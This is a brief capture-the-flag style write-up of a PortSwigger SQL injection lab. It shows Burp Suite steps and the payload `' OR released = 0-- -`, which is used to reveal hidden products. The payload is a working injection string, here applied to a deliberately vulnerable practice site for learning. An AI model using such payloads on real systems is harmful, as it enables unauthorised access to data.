# SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

> This writeup follows the OWASP Web Security Testing Guide (WSTG) methodology.

---

## Goal

To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.

---

## Lab

https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

---

## OWASP Category

SQLi

---

## Steps to Solve

**Step 1 — Fetch the request in Burp Suite**

See the parameter use in url for SQL quary.

<img width="1188" height="333" alt="image" src="https://github.com/user-attachments/assets/f8b4c295-aaf8-4aef-8775-1c6b3754c9cb" />


---

**Step 2 — Make SQL quary**

Mkae quary of SQL that give hidden data.

```http
' OR released = 0-- -
```

<img width="1163" height="307" alt="image" src="https://github.com/user-attachments/assets/6772ff74-accb-41f0-918f-c44ac3632ca5" />


---

**Step 3 — Hindden data released**


<img width="1518" height="778" alt="image" src="https://github.com/user-attachments/assets/7bdaf1f5-3914-4eef-8412-6978745287d6" />


---

**Lab Solved**


<img width="1476" height="325" alt="image" src="https://github.com/user-attachments/assets/845c1ff1-f42e-40f5-ad0e-32bf797ffe5f" />


---

*This writeup is intended for educational purposes only. All techniques documented here were performed on PortSwigger's intentionally vulnerable practice platform. The author does not encourage or condone the use of these methods against any system without explicit written permission. Unauthorized use of these techniques may violate applicable laws and regulations.*
